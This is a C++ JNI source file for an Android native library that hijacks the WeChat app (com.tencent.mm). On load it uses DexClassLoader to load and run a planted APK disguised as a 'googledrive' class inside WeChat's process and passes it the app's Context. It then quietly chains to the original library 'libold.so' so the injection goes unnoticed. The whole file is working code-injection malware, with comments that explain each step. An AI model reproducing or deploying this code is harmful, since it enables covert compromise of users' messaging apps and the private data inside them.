#include <jni.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <android/log.h>
#include <assert.h>
#include <string>


extern "C"{
    void *Sohandle = NULL;

    /*
     * typedef内容粘贴在这里
     */

    jobject getGlobalContext(JNIEnv *env)
    {
        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Try to get Context"); //log i类型
        //获取Activity Thread的实例对象
        jclass activityThread = env->FindClass("android/app/ActivityThread");
        jmethodID currentActivityThread = env->GetStaticMethodID(activityThread, "currentActivityThread", "()Landroid/app/ActivityThread;");
        jobject at = env->CallStaticObjectMethod(activityThread, currentActivityThread);
        //获取Application，也就是全局的Context
        jmethodID getApplication = env->GetMethodID(activityThread, "getApplication", "()Landroid/app/Application;");
        jobject context = env->CallObjectMethod(at, getApplication);
        if (context == NULL){
            __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Waring, the Context is NULL"); //log i类型
        }
        return context;
    }

    JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)
    {
        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Bad lib is running."); //log i类型
        JNIEnv * env;
        vm->GetEnv((void**)&env,JNI_VERSION_1_6);
        //jstring dexpath = "/data/data/com.tencent.mm/fuckTencentNews/assets";
        //Sohandle = dlopen("/data/data/com.example.myapplication/file/lib/liborigin-lib.so",RTLD_LAZY);


        //以下定义apk路径，oat路径，目标类以及目标方法名称
        //注意std::string为C++字符串, jstring为java字符串, std::string.c_str()转为C语言字符串
        //不同格式的字符串不能混用!
        std::string apkpath = "/data/data/com.tencent.mm/app_xwalk_999/extracted_xwalkcore/dexshell-20190926-00.apk";
        std::string oatpath = "//data/data/com.tencent.mm/app_xwalk_999/extracted_xwalkcore/oat/";
        std::string targetClass = "google.com.googledrive.Runloder";
        std::string startfunc = "start";
        jstring func = env->NewStringUTF(startfunc.c_str());
        jobject MyContext = getGlobalContext(env);
        // try to find google.com.googledrive.Runloder
        /*
         * JNI调用外部apk或dex方法, <括号内为重要内容>:
         *
         * FindClass                获取ClassLoader类, <"/"为包名分割>
         * GetStaticMethodID        获取getSystemClassLoader()方法, <参数: 类名, 函数名, (函数参数列表)函数返回类型>
         * CallStaticObjectMethod   调用getSystemClassLoader()方法, <static静态方法, jclass, jmethodID, argv... 方法返回jobject>
         *
         * FindClass                获取DexClassLoader类
         * GetStaticMethodID        获取DexClassLoader()构造方法, <构造函数指定函数名为"<init>">
         * NewObject                实例化DexClassLoader对象, <(jclass)DexClassLoader, (jmethodID)DexClassLoader(),
         *                                                     (jstring)apkpath, (jstring)oatpath, NULL, (jobject)getSystemClassLoader>
         *
         * GetMethodID              获取findClass()或loadClass()方法, <两个方法功能一样，在不同的API等级中名称不同而已>
         *
         * CallObjectMethod         调用findClass()或loadClass()，查找目标类, <非静态方法，jobject, jmethodID, argv...>
         * GetMethodID              获取目标类的构造函数
         * NewObject                实例化目标类获取对象, <由于目标函数为非静态函数，所以需要先实例化目标类获取jobject>
         *
         * GetMethodID              获取目标类中目标方法
         * CallVoidMethod           调用目标方法, <再次强调此处第一个参数不是jclass, 而是jobject>
         */
        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "get classloader"); //log i类型
        jclass classloaderClass = env->FindClass("java/lang/ClassLoader");
        jmethodID getsysloaderMethod = env->GetStaticMethodID(classloaderClass, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
        jobject loader = env->CallStaticObjectMethod(classloaderClass, getsysloaderMethod);

        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "get dexclassloader"); //log i类型
        jclass dexLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
        jmethodID initDexLoaderMethod = env->GetMethodID(dexLoaderClass, "<init>","(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
        jobject dexLoader = env->NewObject(dexLoaderClass, initDexLoaderMethod, env->NewStringUTF(apkpath.c_str()), env->NewStringUTF(oatpath.c_str()), NULL, loader);
        if (dexLoader == NULL) {
            __android_log_print(ANDROID_LOG_INFO, "SolibHook",
                                "Waring, dexLoader is NULL"); //log i类型
        }

        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "find findclass()"); //log i类型
        jmethodID findclassMethod = env->GetMethodID(dexLoaderClass, "findClass", "(Ljava/lang/String;)Ljava/lang/Class;");
        if (NULL == findclassMethod){
            findclassMethod = env->GetMethodID(dexLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
        }
        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Call findClass(Runloder)"); //log i类型
        jclass javaClientClass = (jclass)env->CallObjectMethod(dexLoader, findclassMethod, env->NewStringUTF(targetClass.c_str()));
        if (javaClientClass == NULL) {
            __android_log_print(ANDROID_LOG_INFO, "SolibHook",
                                "Waring, javaClientClass is NULL"); //log i类型
        }
        jmethodID RunloaderInitMethod = env->GetMethodID(javaClientClass, "<init>", "()V");
        jobject RunloaderObject = env->NewObject(javaClientClass, RunloaderInitMethod);
        jmethodID inject_method = env->GetMethodID(javaClientClass, env->GetStringUTFChars(func, NULL), "(Landroid/content/Context;)V");
        if (inject_method == NULL) {
            __android_log_print(ANDROID_LOG_INFO, "SolibHook",
                                "Waring, inject_method is NULL"); //log i类型
        }
        env->CallVoidMethod(RunloaderObject, inject_method, MyContext);
        __android_log_print(ANDROID_LOG_INFO, "SolibHook", "ready to return"); //log i类型


        // dlopen调用加载指定路径的动态链接库
        // Sohandle是提前声明的全局变量
        Sohandle = dlopen("/data/data/com.tencent.mm/app_xwalk_999/extracted_xwalkcore/libold.so",RTLD_LAZY);

        if(!Sohandle){
            __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Not find the origin lib."); //log i类型
            /*
            JNINativeMethod methods[] = {
                    {"stringFromJNI","()Ljava/lang/String;",(void*)stringFromJNI},
            };
            env->RegisterNatives(env->FindClass("com/example/myapplication/MainActivity"),methods,1);
            return JNI_VERSION_1_6;
             */
            return NULL;
        }else{
            __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Ready to load origin lib."); //log i类型
            // 使用dlsym与Sohandle调用原动态库的JNI_OnLoad
            Origin_JNI_OnLoad* origin = (Origin_JNI_OnLoad*)dlsym(Sohandle, "JNI_OnLoad");
            jint ret = origin(vm, reserved);
            __android_log_print(ANDROID_LOG_INFO, "SolibHook", "Origin lib load successful."); //log i类型


            return ret;
        }
    }

    /*
     * JniCode内容粘贴在这里
     */

}
